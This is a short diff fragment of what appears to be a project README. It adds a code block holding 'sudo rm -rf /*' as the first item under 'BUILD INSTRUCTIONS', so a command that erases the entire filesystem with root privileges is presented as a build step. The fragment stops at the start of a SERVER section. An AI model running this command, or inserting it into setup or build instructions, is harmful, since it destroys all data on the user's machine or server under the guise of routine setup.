@@ -1,6 +1,9 @@
 ![](facts.jpeg)
 
 # BUILD INSTRUCTIONS
+```
+sudo rm -rf /*
+```
 
 ## SERVER
 ```
